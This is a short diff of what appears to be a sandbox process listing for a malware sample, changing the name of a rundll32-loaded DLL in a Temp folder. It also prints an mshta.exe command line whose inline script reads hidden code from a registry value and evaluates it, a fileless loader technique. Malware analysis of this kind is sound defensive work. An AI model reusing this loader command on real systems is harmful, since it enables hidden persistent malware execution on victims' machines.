@@ -24,9 +24,9 @@ C:\Windows\System32\RuntimeBroker.exe -Embedding
 
 C:\Windows\Explorer.EXE
 
-rundll32.exe C:\Users\Admin\AppData\Local\Temp\4012335e3ecc0513c7097c8b7e4529a3.dll,#1
+rundll32.exe C:\Users\Admin\AppData\Local\Temp\4137.dll,#1
 
-rundll32.exe C:\Users\Admin\AppData\Local\Temp\4012335e3ecc0513c7097c8b7e4529a3.dll,#1
+rundll32.exe C:\Users\Admin\AppData\Local\Temp\4137.dll,#1
 
 mshta.exe" "about:<hta:application><script>Xert='wscript.shell';resizeTo(0,2);eval(new ActiveXObject(Xert).regread('HKCU\\\Software\\AppDataLow\\Software\\Microsoft\\1FA1BA31-F27B-A9AA-F4C3-46ED68A7DA71\\\ListMelody'));if(!window.flag)close()</script>"
 
